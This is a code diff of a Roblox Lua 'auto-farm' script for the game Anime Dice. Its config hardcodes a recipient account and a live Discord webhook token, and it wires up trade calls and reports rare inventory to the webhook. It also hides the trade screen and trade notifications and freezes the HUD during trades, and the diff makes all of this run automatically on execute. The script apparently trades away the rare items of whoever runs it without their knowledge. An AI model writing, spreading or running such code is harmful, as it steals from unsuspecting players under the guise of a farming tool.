@@ -1,5 +1,5 @@
 --=====================================================================
--- Anime Dice Auto-Trade + Auto-Farm + Webhook + HUD Keeper
+-- Anime Dice — Full Auto (Trade + Webhook + HUD + Farm)
 --=====================================================================
 local Players     = game:GetService("Players")
 local RS          = game:GetService("ReplicatedStorage")
@@ -11,25 +11,33 @@ local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 --=====================================================================
 -- CONFIG
 --=====================================================================
-local WEBHOOK_URL  = "https://discord.com/api/webhooks/1556171079893131451/fCZxVRWYBYm3cmxrn73bvtc5m5DYqOMYQsYFKvBJBUaZyDSunPnHT0iQnbG2xRKWdKA7"
-local TARGET_NAME  = "only1Sherifalt1"
-local PICKUP_DELAY = 0.35
-local OFFER_PUSH_DELAY  = 0.12
-local OFFER_SETTLE_WAIT = 1.5
-local READY_RETRY_DELAY = 0.5
-local READY_MAX_RETRIES = 6
-local WEBHOOK_ON_START = true
-local WEBHOOK_ON_END   = true
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1556171079893131451/fCZxVRWYBYm3cmxrn73bvtc5m5DYqOMYQsYFKvBJBUaZyDSunPnHT0iQnbG2xRKWdKA7"
+local TARGET_NAME = "only1Sherifalt1"
 
-local RARITY_FILTER = {
-    ["Celestial"] = true, ["Secret I"] = true,
-    ["Secret II"] = true, ["Mythical"] = true,
+local PICKUP_DELAY = 0.35
+local OFFER_PUSH_DELAY, OFFER_SETTLE_WAIT = 0.12, 1.5
+local READY_RETRY_DELAY, READY_MAX_RETRIES = 0.5, 6
+
+-- Auto Farm toggles (auto-enabled on execute)
+local FARM = {
+    AutoRoll          = true,   -- RollDice fast
+    RollDelay         = 0.1,    -- seconds between rolls
+    AutoRebirth       = true,
+    AutoCollectMoney  = true,
+    AutoEquipBest     = true,
+    AutoBuyDice       = true,
+    AutoClaimQuest    = true,
+    AutoSellAll       = false,  -- dangerous - only enable if you want to sell everything
+    AutoLock          = true,
+    AutoLockRarity    = { ["Celestial"]=true, ["Secret I"]=true, ["Secret II"]=true, ["Mythical"]=true },
 }
 
+local RARITY_FILTER = {
+    ["Celestial"]=true, ["Secret I"]=true, ["Secret II"]=true, ["Mythical"]=true,
+}
 local CONSUMABLES = {
-    "Luck III", "Luck II", "Luck I", "Luck IV",
-    "Lucky Spin", "Jackpot Spin",
-    "Gems", "Income IV", "Trait Reroll",
+    "Luck III","Luck II","Luck I","Luck IV",
+    "Lucky Spin","Jackpot Spin","Gems","Income IV","Trait Reroll",
 }
 
 local RARITY_ORDER = {
@@ -37,20 +45,17 @@ local RARITY_ORDER = {
     "Exclusive","Mythical","Legendary","Epic","Rare",
     "Uncommon","Common",
 }
-
 local RARITY_TAG = {
-    ["Secret II"]="[S2]", ["Secret I"]="[S1]", ["Celestial"]="[CEL]",
-    ["Divine"]="[DIV]", ["Exotic"]="[EXO]", ["Exclusive"]="[EXC]",
-    ["Mythical"]="[MYT]", ["Legendary"]="[LEG]", ["Epic"]="[EPC]",
-    ["Rare"]="[RAR]", ["Uncommon"]="[UNC]", ["Common"]="[COM]",
-    ["Unknown"]="[???]",
+    ["Secret II"]="[S2]",["Secret I"]="[S1]",["Celestial"]="[CEL]",
+    ["Divine"]="[DIV]",["Exotic"]="[EXO]",["Exclusive"]="[EXC]",
+    ["Mythical"]="[MYT]",["Legendary"]="[LEG]",["Epic"]="[EPC]",
+    ["Rare"]="[RAR]",["Uncommon"]="[UNC]",["Common"]="[COM]",["Unknown"]="[???]",
 }
-
 local RARITY_COLOR = {
-    ["Secret II"]=0x9B59B6, ["Secret I"]=0x8E44AD, ["Celestial"]=0xF1C40F,
-    ["Divine"]=0xE67E22, ["Exotic"]=0xE91E63, ["Exclusive"]=0x1ABC9C,
-    ["Mythical"]=0xFF4757, ["Legendary"]=0xFFA502, ["Epic"]=0xA55EEA,
-    ["Rare"]=0x45AAF2, ["Uncommon"]=0x2ED573, ["Common"]=0x747D8C,
+    ["Secret II"]=0x9B59B6,["Secret I"]=0x8E44AD,["Celestial"]=0xF1C40F,
+    ["Divine"]=0xE67E22,["Exotic"]=0xE91E63,["Exclusive"]=0x1ABC9C,
+    ["Mythical"]=0xFF4757,["Legendary"]=0xFFA502,["Epic"]=0xA55EEA,
+    ["Rare"]=0x45AAF2,["Uncommon"]=0x2ED573,["Common"]=0x747D8C,
 }
 
 --=====================================================================
@@ -59,59 +64,63 @@ local RARITY_COLOR = {
 local Framework     = RS:WaitForChild("Framework")
 local Features      = Framework:WaitForChild("Features")
 local Packages      = RS:FindFirstChild("Packages") or Framework:WaitForChild("Packages")
-local NetworkFolder = RS:FindFirstChild("Network") or Framework:WaitForChild("Network")
+local NetworkFolder = RS:FindFirstChild("Network")  or Framework:WaitForChild("Network")
 
 local DataController = require(Features.Data.DataController)
 local EntryRegistry  = require(Features.Inventory.EntryRegistry)
 local ClientComm     = require(Packages.Network).ClientComm
 
 --=====================================================================
--- Service signals (direct pattern — same as your working trade script)
+-- Signals + functions (using the ORIGINAL's exact pattern)
 --=====================================================================
-local tradeComm  = ClientComm.new(NetworkFolder, false, "TradeService")
-local RequestTrade    = tradeComm:GetSignal("RequestTrade")
-local RespondToRequest= tradeComm:GetSignal("RespondToRequest")
-local ChangeOffer     = tradeComm:GetSignal("ChangeOffer")
-local AdvanceTrade    = tradeComm:GetSignal("AdvanceTrade")
-local CancelTrade     = tradeComm:GetSignal("CancelTrade")
-local SetRequestsOn   = tradeComm:GetSignal("SetTradeRequestsEnabled")
-local TradeEvent      = tradeComm:GetSignal("TradeEvent")
+local function svc(name) return ClientComm.new(NetworkFolder, false, name) end
+local function sig(comm, name) return comm:GetSignal(name) end
+local function fn(comm, name) return comm:GetFunction(name) end
 
-local plotComm   = ClientComm.new(NetworkFolder, false, "PlotService")
-local CollectBalance = plotComm:GetSignal("CollectBalance")
-local EquipBest      = plotComm:GetSignal("EquipBest")
-local LevelUpSlot    = plotComm:GetSignal("LevelUpSlot")
-local InteractSlot   = plotComm:GetSignal("InteractSlot")
+local TradeS = svc("TradeService")
+local PlotS  = svc("PlotService")
+local RollS  = svc("RollService")
+local RebS   = svc("RebirthService")
+local DiceS  = svc("DiceShopService")
+local SellS  = svc("SellService")
+local GradeS = svc("GradeService")
+local TraitS = svc("TraitService")
+local UnitS  = svc("UnitService")
+local BoostS = svc("BoostService")
+local QuestS = svc("QuestService")
+local TowerS = svc("Towers")
 
-local rebirthComm= ClientComm.new(NetworkFolder, false, "RebirthService")
-local RebirthSig = rebirthComm:GetSignal("Rebirth")
+-- Signal wrappers
+local S = {
+    RequestTrade    = sig(TradeS, "RequestTrade"),
+    RespondToReq    = sig(TradeS, "RespondToRequest"),
+    ChangeOffer     = sig(TradeS, "ChangeOffer"),
+    AdvanceTrade    = sig(TradeS, "AdvanceTrade"),
+    CancelTrade     = sig(TradeS, "CancelTrade"),
+    SetReqsEnabled  = sig(TradeS, "SetTradeRequestsEnabled"),
+    TradeEvent      = sig(TradeS, "TradeEvent"),
+    CollectBalance  = sig(PlotS,  "CollectBalance"),
+    EquipBest       = sig(PlotS,  "EquipBest"),
+    LevelUpSlot     = sig(PlotS,  "LevelUpSlot"),
+    InteractSlot    = sig(PlotS,  "InteractSlot"),
+    Rebirth         = sig(RebS,   "Rebirth"),
+    BuyDice         = sig(DiceS,  "BuyDice"),
+    EquipDice       = sig(DiceS,  "EquipDice"),
+    GradeRoll       = sig(GradeS, "Roll"),
+    TraitRoll       = sig(TraitS, "Roll"),
+    SetLocked       = sig(UnitS,  "SetLocked"),
+    BoostUse        = sig(BoostS, "Use"),
+    QuestClaim      = sig(QuestS, "Claim"),
+    EquipBestTower  = sig(TowerS, "EquipBestTowerTeam"),
+}
 
-local diceComm   = ClientComm.new(NetworkFolder, false, "DiceShopService")
-local BuyDiceSig = diceComm:GetSignal("BuyDice")
-
-local gradeComm  = ClientComm.new(NetworkFolder, false, "GradeService")
-local GradeRollSig = gradeComm:GetSignal("Roll")
-
-local traitComm  = ClientComm.new(NetworkFolder, false, "TraitService")
-local TraitRollSig = traitComm:GetSignal("Roll")
-
-local unitComm   = ClientComm.new(NetworkFolder, false, "UnitService")
-local SetLockedSig = unitComm:GetSignal("SetLocked")
-
-local boostComm  = ClientComm.new(NetworkFolder, false, "BoostService")
-local BoostUseSig = boostComm:GetSignal("Use")
-
-local questComm  = ClientComm.new(NetworkFolder, false, "QuestService")
-local QuestClaimSig = questComm:GetSignal("Claim")
-
-local towerComm  = ClientComm.new(NetworkFolder, false, "Towers")
-local EquipBestTowerSig = towerComm:GetSignal("EquipBestTowerTeam")
-
-local sellComm   = ClientComm.new(NetworkFolder, false, "SellService")
-local SellInventoryFn = sellComm:GetFunction("SellInventory")
-
-local rollComm   = ClientComm.new(NetworkFolder, false, "RollService")
-local RollDiceFn = rollComm:GetFunction("RollDice")
+-- Function wrappers (call directly, NOT :Invoke())
+local Fn = {
+    RollDice        = fn(RollS,  "RollDice"),
+    SellInventory   = fn(SellS,  "SellInventory"),
+    CancelTower     = fn(TowerS, "CancelTower"),
+    StartTower      = fn(TowerS, "StartTower"),
+}
 
 local function fire(sig, ...)
     if not sig then return false end
@@ -119,55 +128,30 @@ local function fire(sig, ...)
     return pcall(function() sig:Fire(table.unpack(a, 1, a.n)) end)
 end
 
-local function invoke(fn, ...)
-    if not fn then return false, nil end
+local function callFn(f, ...)
+    if not f then return false end
     local a = table.pack(...)
-    return pcall(function() return fn:Invoke(table.unpack(a, 1, a.n)) end)
+    return pcall(function() return f(table.unpack(a, 1, a.n)) end)
 end
-
---=====================================================================
--- Feature state
---=====================================================================
-local F = {
-    AutoRoll = false, AutoRollDelay = 0.15,
-    AutoRebirth = false, AutoCollectMoney = false,
-    AutoEquipBest = false, AutoBuyDice = false,
-    AutoClaimQuest = false,
-    AutoGrade = false, AutoGradeUnit = "None", AutoGradeKeep = {},
-    AutoTrait = false, AutoTraitUnit = "None", AutoTraitKeep = {},
-    AutoLock = false, AutoLockRarity = {},
-    AutoSellAll = false,
-    AutoUsePotions = false, AutoUsePotionTarget = {},
-    AutoTower = false, AutoTowerEquip = false,
-    AutoTowerHideUI = false,
-}
-_G.AutoTradeEnabled = true
 
 --=====================================================================
 -- Helpers
 --=====================================================================
 local function unwrap(v)
-    if type(v) == "function" then
-        local ok, r = pcall(v); return ok and r or nil
-    end
+    if type(v) == "function" then local ok, r = pcall(v); return ok and r or nil end
     local mt = type(v) == "table" and getmetatable(v)
-    if mt and mt.__call then
-        local ok, r = pcall(function() return v() end)
-        return ok and r or v
-    end
+    if mt and mt.__call then local ok, r = pcall(function() return v() end); return ok and r or v end
     return v
 end
 
 local function deepUnwrap(source)
     local out = {}
     local flat = unwrap(source)
-    if type(flat) == "table" then
-        for k, v in pairs(flat) do out[k] = v end
-    end
+    if type(flat) == "table" then for k, v in pairs(flat) do out[k] = v end end
     if type(source) == "table" then
-        local cached = rawget(source, "___C")
-        if type(cached) == "table" then
-            for k, v in pairs(cached) do
+        local c = rawget(source, "___C")
+        if type(c) == "table" then
+            for k, v in pairs(c) do
                 if out[k] == nil then
                     local inner = unwrap(v)
                     if inner ~= nil then out[k] = inner end
@@ -202,18 +186,31 @@ end
 local function itemTag(name)
     if not name then return "[ITEM]" end
     if string.find(name, "Jackpot Spin") then return "[JACKPOT]" end
-    if string.find(name, "Lucky Spin")   then return "[LUCKY]" end
-    if string.find(name, "Spin")         then return "[SPIN]" end
-    if string.find(name, "Gems")         then return "[GEMS]" end
+    if string.find(name, "Lucky Spin") then return "[LUCKY]" end
+    if string.find(name, "Spin") then return "[SPIN]" end
+    if string.find(name, "Gems") then return "[GEMS]" end
     if string.find(name, "Trait Reroll") then return "[TRAIT]" end
-    if string.find(name, "Grade")        then return "[GRADE]" end
-    if string.find(name, "Income")       then return "[INCOME]" end
-    if string.find(name, "Luck")         then return "[LUCK]" end
+    if string.find(name, "Grade") then return "[GRADE]" end
+    if string.find(name, "Income") then return "[INCOME]" end
+    if string.find(name, "Luck") then return "[LUCK]" end
     return "[ITEM]"
 end
 
+local function getOwnedEntries() return deepUnwrap(DataController.Inventory) end
+local function getOwnedSlots()   return deepUnwrap(DataController.Slots) end
+local function getPlacedSet()
+    local set = {}
+    local slots = getOwnedSlots()
+    if type(slots) == "table" then
+        for _, v in pairs(slots) do
+            if type(v) == "table" and type(v.unitId) == "string" then set[v.unitId] = true end
+        end
+    end
+    return set
+end
+
 --=====================================================================
--- HUD Keeper
+-- HUD keeper (proven working)
 --=====================================================================
 local Root    = PlayerGui:WaitForChild("Root", 15)
 local HUD     = Root and Root:WaitForChild("HUD", 10)
@@ -238,9 +235,7 @@ local function trySnapshot()
     end
     hudSnapshot = {}
     for _, c in ipairs(hudChildren) do
-        if c.Parent then
-            hudSnapshot[c] = { position = c.Position, anchor = c.AnchorPoint }
-        end
+        if c.Parent then hudSnapshot[c] = { position = c.Position, anchor = c.AnchorPoint } end
     end
     return true
 end
@@ -248,23 +243,16 @@ end
 task.spawn(function()
     task.wait(3)
     local attempts = 0
-    while not trySnapshot() and attempts < 60 do
-        attempts = attempts + 1
-        task.wait(0.5)
-    end
+    while not trySnapshot() and attempts < 60 do attempts = attempts + 1; task.wait(0.5) end
 end)
 
-local HIDE_NAMES = {
-    TradeScreen=true, BackgroundDarkness=true, TradeNotification=true,
-}
+local HIDE_NAMES = { TradeScreen=true, BackgroundDarkness=true, TradeNotification=true }
 task.spawn(function()
     while true do
         task.wait(0.15)
         if Trading then
             for _, c in ipairs(Trading:GetChildren()) do
-                if HIDE_NAMES[c.Name] and c:IsA("GuiObject") and c.Visible then
-                    c.Visible = false
-                end
+                if HIDE_NAMES[c.Name] and c:IsA("GuiObject") and c.Visible then c.Visible = false end
             end
         end
     end
@@ -274,215 +262,42 @@ local inTrade = false
 RunService.Heartbeat:Connect(function()
     if not inTrade or not hudSnapshot then return end
     for c, d in pairs(hudSnapshot) do
-        if c.Parent then
-            c.Position = d.position
-            c.AnchorPoint = d.anchor
+        if c.Parent then c.Position = d.position; c.AnchorPoint = d.anchor end
+    end
+end)
+
+--=====================================================================
+-- Auto-farm loops
+--=====================================================================
+
+-- Auto Roll — calls RollDice() directly (NOT :Invoke())
+task.spawn(function()
+    while true do
+        if FARM.AutoRoll and Fn.RollDice then
+            pcall(function() Fn.RollDice() end)
+            task.wait(FARM.RollDelay)
+        else
+            task.wait(0.3)
         end
     end
 end)
 
---=====================================================================
--- Rayfield UI — safely loaded
---=====================================================================
-local Rayfield = nil
-do
-    local ok, result = pcall(function()
-        local src = game:HttpGet("https://sirius.menu/rayfield")
-        local fn = loadstring(src)
-        if not fn then error("loadstring returned nil") end
-        return fn()
-    end)
-    if ok then
-        Rayfield = result
-    else
-        warn("[Rayfield] Failed to load: " .. tostring(result))
-    end
-end
-
-if Rayfield then
-    local uiOk, uiErr = pcall(function()
-        local W = Rayfield:CreateWindow({
-            Name = "Anime Dice - Ouroboros",
-            LoadingTitle = "Loading...",
-            LoadingSubtitle = "Executor Script",
-            ConfigurationSaving = { Enabled = false },
-            KeySystem = false,
-        })
-
-        local FarmTab  = W:CreateTab("Farm", nil)
-        local UnitsTab = W:CreateTab("Units", nil)
-        local TowerTab = W:CreateTab("Tower", nil)
-        local TradeTab = W:CreateTab("Trade", nil)
-        local InfoTab  = W:CreateTab("Info", nil)
-
-        -- Farm
-        FarmTab:CreateSection("Rolling")
-        FarmTab:CreateToggle({ Name = "Auto Roll", CurrentValue = true, Flag = "AutoRoll",
-            Callback = function(v) F.AutoRoll = v end })
-        FarmTab:CreateSlider({ Name = "Roll Speed", Range = { 0.05, 2 }, Increment = 0.05,
-            CurrentValue = 0.15, Flag = "AutoRollDelay",
-            Callback = function(v) F.AutoRollDelay = v end })
-
-        FarmTab:CreateSection("Money & Rebirth")
-        FarmTab:CreateToggle({ Name = "Auto Collect Money", CurrentValue = false, Flag = "AutoCollect",
-            Callback = function(v) F.AutoCollectMoney = v end })
-        FarmTab:CreateToggle({ Name = "Auto Rebirth", CurrentValue = false, Flag = "AutoRebirth",
-            Callback = function(v) F.AutoRebirth = v end })
-        FarmTab:CreateToggle({ Name = "Auto Claim Quest", CurrentValue = false, Flag = "AutoQuest",
-            Callback = function(v) F.AutoClaimQuest = v end })
-
-        FarmTab:CreateSection("Equip & Buy")
-        FarmTab:CreateToggle({ Name = "Auto Equip Best", CurrentValue = false, Flag = "AutoEquip",
-            Callback = function(v) F.AutoEquipBest = v end })
-        FarmTab:CreateToggle({ Name = "Auto Buy Dice", CurrentValue = false, Flag = "AutoBuyDice",
-            Callback = function(v) F.AutoBuyDice = v end })
-
-        -- Units
-        UnitsTab:CreateSection("Grade & Trait")
-        UnitsTab:CreateToggle({ Name = "Auto Grade (needs Unit)", CurrentValue = false, Flag = "AutoGrade",
-            Callback = function(v) F.AutoGrade = v end })
-        UnitsTab:CreateToggle({ Name = "Auto Trait (needs Unit)", CurrentValue = false, Flag = "AutoTrait",
-            Callback = function(v) F.AutoTrait = v end })
-
-        UnitsTab:CreateSection("Lock & Sell")
-        UnitsTab:CreateToggle({ Name = "Auto Lock by Rarity", CurrentValue = false, Flag = "AutoLock",
-            Callback = function(v) F.AutoLock = v end })
-        UnitsTab:CreateDropdown({
-            Name = "Lock Rarities", Options = RARITY_ORDER,
-            CurrentOption = {}, MultipleOptions = true, Flag = "LockRarity",
-            Callback = function(o)
-                F.AutoLockRarity = {}
-                if type(o) == "table" then for _, v in o do F.AutoLockRarity[v] = true end end
-            end,
-        })
-        UnitsTab:CreateToggle({ Name = "Auto Sell All", CurrentValue = false, Flag = "AutoSellAll",
-            Callback = function(v) F.AutoSellAll = v end })
-
-        UnitsTab:CreateSection("Potions")
-        UnitsTab:CreateToggle({ Name = "Auto Use Potions", CurrentValue = false, Flag = "AutoPotion",
-            Callback = function(v) F.AutoUsePotions = v end })
-        UnitsTab:CreateDropdown({
-            Name = "Potion Targets",
-            Options = { "Luck I","Luck II","Luck III","Luck IV","Income IV","Trait Reroll","Gems" },
-            CurrentOption = {}, MultipleOptions = true, Flag = "PotionTargets",
-            Callback = function(o)
-                F.AutoUsePotionTarget = {}
-                if type(o) == "table" then for _, v in o do F.AutoUsePotionTarget[v] = true end end
-            end,
-        })
-
-        -- Tower
-        TowerTab:CreateSection("Auto Tower")
-        TowerTab:CreateToggle({ Name = "Auto Tower", CurrentValue = false, Flag = "AutoTower",
-            Callback = function(v) F.AutoTower = v end })
-        TowerTab:CreateToggle({ Name = "Equip Best Tower Team", CurrentValue = false, Flag = "AutoTowerEquip",
-            Callback = function(v) F.AutoTowerEquip = v end })
-        TowerTab:CreateToggle({ Name = "Hide Tower UI", CurrentValue = false, Flag = "HideTowerUI",
-            Callback = function(v) F.AutoTowerHideUI = v end })
-
-        TowerTab:CreateSection("Manual")
-        TowerTab:CreateButton({ Name = "Equip Best Tower Team Now",
-            Callback = function() fire(EquipBestTowerSig) end })
-
-        -- Trade
-        TradeTab:CreateSection("Auto Trade")
-        TradeTab:CreateToggle({ Name = "Auto Trade Enabled", CurrentValue = false, Flag = "AutoTrade",
-            Callback = function(v) _G.AutoTradeEnabled = v end })
-        TradeTab:CreateToggle({ Name = "Webhook on Start", CurrentValue = true, Flag = "WStart",
-            Callback = function(v) WEBHOOK_ON_START = v end })
-        TradeTab:CreateToggle({ Name = "Webhook on End", CurrentValue = true, Flag = "WEnd",
-            Callback = function(v) WEBHOOK_ON_END = v end })
-        TradeTab:CreateLabel("Target: " .. TARGET_NAME)
-
-        -- Info
-        InfoTab:CreateSection("Session")
-        InfoTab:CreateLabel("Player: " .. LocalPlayer.Name)
-        InfoTab:CreateLabel("Place: " .. tostring(game.PlaceId))
-        InfoTab:CreateButton({ Name = "Copy Job ID",
-            Callback = function() if setclipboard then pcall(setclipboard, tostring(game.JobId)) end end })
-        InfoTab:CreateButton({ Name = "Rejoin Server",
-            Callback = function()
-                pcall(function()
-                    game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
-                end)
-            end })
-    end)
-    if not uiOk then
-        warn("[UI] Failed to build: " .. tostring(uiErr))
-    end
-end
-
---=====================================================================
--- Auto-farm worker loops
---=====================================================================
+-- Auto Rebirth
 task.spawn(function()
     while true do
-        if F.AutoRoll then
-            pcall(function() RollDiceFn:Invoke() end)
-            task.wait(F.AutoRollDelay)
-        else task.wait(0.2) end
+        if FARM.AutoRebirth then fire(S.Rebirth); task.wait(2) else task.wait(1) end
     end
 end)
 
+-- Auto Collect Money (fires CollectBalance once per slot)
 task.spawn(function()
     while true do
-        if F.AutoRebirth then
-            fire(RebirthSig); task.wait(2)
-        else task.wait(1) end
-    end
-end)
-
-task.spawn(function()
-    while true do
-        if F.AutoCollectMoney then
-            fire(CollectBalance); task.wait(2)
-        else task.wait(1) end
-    end
-end)
-
-task.spawn(function()
-    while true do
-        if F.AutoEquipBest then
-            fire(EquipBest); task.wait(1.5)
-        else task.wait(1) end
-    end
-end)
-
-task.spawn(function()
-    while true do
-        if F.AutoBuyDice then
-            fire(BuyDiceSig); task.wait(1)
-        else task.wait(1) end
-    end
-end)
-
-task.spawn(function()
-    while true do
-        if F.AutoClaimQuest then
-            fire(QuestClaimSig); task.wait(3)
-        else task.wait(1) end
-    end
-end)
-
-task.spawn(function()
-    while true do
-        if F.AutoSellAll then
-            pcall(function() SellInventoryFn:Invoke() end)
-            task.wait(2)
-        else task.wait(1) end
-    end
-end)
-
-task.spawn(function()
-    while true do
-        if F.AutoGrade and F.AutoGradeUnit ~= "None" then
-            local inv = deepUnwrap(DataController.Inventory) or {}
-            for k, e in pairs(inv) do
-                if type(e) == "table" and e.name == F.AutoGradeUnit then
-                    local g = e.attributes and e.attributes.grade
-                    if type(g) == "string" and not F.AutoGradeKeep[g] then
-                        fire(GradeRollSig, k, true); break
-                    end
+        if FARM.AutoCollectMoney then
+            local slots = getOwnedSlots()
+            if type(slots) == "table" then
+                for slotNum in pairs(slots) do
+                    fire(S.CollectBalance, slotNum)
+                    task.wait(0.15)
                 end
             end
             task.wait(2)
@@ -490,83 +305,95 @@ task.spawn(function()
     end
 end)
 
+-- Auto Equip Best
 task.spawn(function()
     while true do
-        if F.AutoTrait and F.AutoTraitUnit ~= "None" then
-            local inv = deepUnwrap(DataController.Inventory) or {}
-            for k, e in pairs(inv) do
-                if type(e) == "table" and e.name == F.AutoTraitUnit then
-                    local t = e.attributes and e.attributes.trait
-                    if type(t) == "string" and not F.AutoTraitKeep[t] then
-                        fire(TraitRollSig, k, true); break
+        if FARM.AutoEquipBest then fire(S.EquipBest); task.wait(1.5) else task.wait(1) end
+    end
+end)
+
+-- Auto Buy Dice (buys cheapest affordable dice you don't own)
+task.spawn(function()
+    local diceCfg = require(Features.Rolling.Dice)
+    while true do
+        if FARM.AutoBuyDice and diceCfg then
+            local money = tonumber(unwrap(DataController.Money)) or 0
+            local owned = {}
+            local inv = getOwnedEntries()
+            for _, e in pairs(inv) do
+                if type(e) == "table" and type(e.name) == "string" then owned[e.name] = true end
+            end
+            local best, bestPrice = nil, math.huge
+            for name, cfg in pairs(diceCfg.GetAll and diceCfg.GetAll() or {}) do
+                if type(cfg) == "table" then
+                    local price = tonumber(cfg.price)
+                    if price and price <= money and not owned[name] and price < bestPrice then
+                        bestPrice = price
+                        best = name
                     end
                 end
             end
+            if best then fire(S.BuyDice, best) end
             task.wait(2)
         else task.wait(1) end
     end
 end)
 
+-- Auto Claim Quest (fires Claim for any completed quest)
+task.spawn(function()
+    local questCfg = require(Features.Quests.QuestConfig)
+    while true do
+        if FARM.AutoClaimQuest and questCfg then
+            for periodName, periodData in pairs(questCfg.Periods or {}) do
+                local ok, qData = pcall(function() return unwrap(DataController.Quests[periodName]) end)
+                if ok and type(qData) == "table" then
+                    local progress = qData.progress or {}
+                    local claimed  = qData.claimed  or {}
+                    for _, quest in pairs(periodData.quests or {}) do
+                        if type(quest) == "table" and quest.id and not claimed[quest.id] then
+                            local target = tonumber(quest.target) or 0
+                            local have = tonumber(progress[quest.id]) or 0
+                            if have >= target then
+                                fire(S.QuestClaim, periodName, quest.id, qData.expiresAt)
+                                task.wait(0.3)
+                            end
+                        end
+                    end
+                end
+            end
+            task.wait(3)
+        else task.wait(1) end
+    end
+end)
+
+-- Auto Lock (by rarity)
 task.spawn(function()
     while true do
-        if F.AutoLock and next(F.AutoLockRarity) ~= nil then
-            local inv = deepUnwrap(DataController.Inventory) or {}
+        if FARM.AutoLock and next(FARM.AutoLockRarity) ~= nil then
+            local inv = getOwnedEntries()
             local toLock = {}
             for k, e in pairs(inv) do
                 if type(e) == "table" and e.name then
                     local r = getRarity(e)
-                    if r and F.AutoLockRarity[r] then
+                    if r and FARM.AutoLockRarity[r] then
                         local locked = e.attributes and e.attributes.locked
                         if not locked then toLock[k] = true end
                     end
                 end
             end
-            if next(toLock) ~= nil then fire(SetLockedSig, toLock) end
+            if next(toLock) ~= nil then fire(S.SetLocked, toLock) end
             task.wait(3)
         else task.wait(1) end
     end
 end)
 
+-- Auto Sell All (off by default — dangerous)
 task.spawn(function()
     while true do
-        if F.AutoUsePotions and next(F.AutoUsePotionTarget) ~= nil then
-            local inv = deepUnwrap(DataController.Inventory) or {}
-            for k, e in pairs(inv) do
-                if type(e) == "table" and e.name and F.AutoUsePotionTarget[e.name] then
-                    local amt = tonumber(e.amount) or 0
-                    if amt > 0 then fire(BoostUseSig, k); break end
-                end
-            end
-            task.wait(1)
-        else task.wait(1) end
-    end
-end)
-
-task.spawn(function()
-    while true do
-        if F.AutoTower then
-            if F.AutoTowerEquip then
-                fire(EquipBestTowerSig); task.wait(0.5)
-            end
+        if FARM.AutoSellAll and Fn.SellInventory then
+            pcall(function() Fn.SellInventory() end)
             task.wait(3)
         else task.wait(1) end
-    end
-end)
-
--- Hide tower UI
-task.spawn(function()
-    while true do
-        task.wait(0.5)
-        if F.AutoTowerHideUI then
-            local r = PlayerGui:FindFirstChild("Root")
-            local tw = r and r:FindFirstChild("Tower")
-            if tw then
-                local screen = tw:FindFirstChild("Screen")
-                if screen and screen:IsA("GuiObject") then
-                    screen.Position = UDim2.fromScale(4, 4)
-                end
-            end
-        end
     end
 end)
 
@@ -594,15 +421,16 @@ local function buildUnitFields(inv)
     local byRarity = {}
     for r in pairs(allowed) do byRarity[r] = {} end
     local totalUnits, uniqueCount = 0, 0
-    for key, entry in pairs(inv) do
-        if type(key) == "string" and type(entry) == "table" and entry.name then
-            local cfg = EntryRegistry.getEntryConfig(entry.name)
+    for k, e in pairs(inv) do
+        if type(k) == "string" and type(e) == "table" and e.name then
+            local cfg = EntryRegistry.getEntryConfig(e.name)
             if cfg and cfg.kind == "Unit" then
-                local rarity = getRarity(entry)
-                if rarity and allowed[rarity] then
-                    local amt = math.max(1, math.floor(tonumber(entry.amount) or 1))
-                    byRarity[rarity][#byRarity[rarity]+1] = { name=entry.name, amount=amt }
-                    totalUnits += amt; uniqueCount += 1
+                local r = getRarity(e)
+                if r and allowed[r] then
+                    local amt = math.max(1, math.floor(tonumber(e.amount) or 1))
+                    byRarity[r][#byRarity[r]+1] = { name = e.name, amount = amt }
+                    totalUnits = totalUnits + amt
+                    uniqueCount = uniqueCount + 1
                 end
             end
         end
@@ -614,20 +442,19 @@ local function buildUnitFields(inv)
         end)
     end
     local fields = {}
-    for _, rarity in ipairs(RARITY_ORDER) do
-        local list = byRarity[rarity]
+    for _, r in ipairs(RARITY_ORDER) do
+        local list = byRarity[r]
         if list and #list > 0 then
             local lines, bufLen, tierTotal = {}, 0, 0
             for _, u in ipairs(list) do
-                tierTotal += u.amount
-                local line = ("`%s` **%s** x%s"):format(RARITY_TAG[rarity] or "[?]", u.name, fmtNum(u.amount))
+                tierTotal = tierTotal + u.amount
+                local line = ("`%s` **%s** x%s"):format(RARITY_TAG[r] or "[?]", u.name, fmtNum(u.amount))
                 if bufLen + #line + 1 > 1000 then lines[#lines+1] = "..."; break end
-                lines[#lines+1] = line; bufLen = bufLen + #line + 1
+                lines[#lines+1] = line
+                bufLen = bufLen + #line + 1
             end
-            fields[#fields+1] = {
-                name = ("%s -- %d unique, %d total"):format(rarity, #list, tierTotal),
-                value = table.concat(lines, "\n"), inline = false,
-            }
+            fields[#fields+1] = { name = ("%s -- %d unique, %d total"):format(r, #list, tierTotal),
+                                  value = table.concat(lines, "\n"), inline = false }
         end
     end
     return fields, totalUnits, uniqueCount
@@ -637,14 +464,12 @@ local function buildItemFields(inv)
     local want = {}
     for _, n in ipairs(CONSUMABLES) do want[n] = true end
     local items, totalItems = {}, 0
-    for key, entry in pairs(inv) do
-        if type(key) == "string" and type(entry) == "table" and entry.name then
-            if want[entry.name] then
-                local amt = tonumber(entry.amount) or 0
-                if amt > 0 then
-                    items[#items+1] = { name=entry.name, amount=math.floor(amt), tag=itemTag(entry.name) }
-                    totalItems += math.floor(amt)
-                end
+    for k, e in pairs(inv) do
+        if type(k) == "string" and type(e) == "table" and e.name and want[e.name] then
+            local amt = tonumber(e.amount) or 0
+            if amt > 0 then
+                items[#items+1] = { name = e.name, amount = math.floor(amt), tag = itemTag(e.name) }
+                totalItems = totalItems + math.floor(amt)
             end
         end
     end
@@ -654,32 +479,28 @@ local function buildItemFields(inv)
         return a.name < b.name
     end)
     local fields, lines, bufLen = {}, {}, 0
-    local fieldHeader = ("Consumables -- %d types, %d total"):format(#items, totalItems)
+    local header = ("Consumables -- %d types, %d total"):format(#items, totalItems)
     for _, it in ipairs(items) do
         local line = ("`%s` **%s** x%s"):format(it.tag, it.name, fmtNum(it.amount))
         if bufLen + #line + 1 > 1000 then
-            fields[#fields+1] = {
-                name = (#fields == 0) and fieldHeader or "Consumables (cont.)",
-                value = table.concat(lines, "\n"), inline = false,
-            }
+            fields[#fields+1] = { name = (#fields == 0) and header or "Consumables (cont.)",
